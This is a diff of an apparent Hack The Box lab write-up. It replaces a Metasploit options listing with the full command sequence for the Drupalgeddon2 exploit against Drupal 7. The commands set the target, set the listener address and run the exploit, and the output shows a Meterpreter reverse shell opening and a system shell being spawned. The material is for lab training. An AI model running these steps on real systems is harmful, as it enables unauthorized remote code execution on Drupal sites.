@@ -32,37 +32,24 @@ Prog Lang - PHP/5.4.16
 Got Metasploit exploit for Drupal 7
 https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/
 
-use exploit(unix/webapp/drupal_drupalgeddon2) and set options like 
-
-	msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options
-
-	Module options (exploit/unix/webapp/drupal_drupalgeddon2):
-
-   	Name         Current Setting  Required  Description
-   	----         ---------------  --------  -----------
-   	DUMP_OUTPUT  false            no        Dump payload command output
-   	PHP_FUNC     passthru         yes       PHP function to execute
-   	Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
-   	RHOSTS       10.10.10.233     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
-   	RPORT        80               yes       The target port (TCP)
-   	SSL          false            no        Negotiate SSL/TLS for outgoing connections
-   	TARGETURI    /?q=user         yes       Path to Drupal install
-   	VHOST                         no        HTTP server virtual host
-
-
-	Payload options (php/meterpreter/reverse_tcp):
-
-   	Name   Current Setting  Required  Description
-   	----   ---------------  --------  -----------
-   	LHOST  10.10.14.16      yes       The listen address (an interface may be specified)
-   	LPORT  4444             yes       The listen port
-
-	Exploit target:
-
-   	Id  Name
-   	--  ----
-   	0   Automatic (PHP In-Memory)
+use exploit/unix/webapp/drupal_drupalgeddon2 this exploit and set options like 
 	
+	msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.10.10.233
+	RHOSTS => 10.10.10.233
+	msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /?q=user
+	TARGETURI => /?q=user
+	msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 10.10.14.xx   		\\your htb ip
+	LHOST => 10.10.14.16
+	msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit
+	
+	[*] Started reverse TCP handler on 10.10.14.16:4444 
+	[*] Sending stage (39282 bytes) to 10.10.10.233
+	[*] Meterpreter session 1 opened (10.10.14.16:4444 -> 10.10.10.233:56262) at 2021-04-28 13:14:25 +0530
+
+	meterpreter > shell	
+	Process 6897 created.
+	Channel 0 created.   
+
 After getting meterpreter session then open the shell and look for settings.php
 
 	cd ..
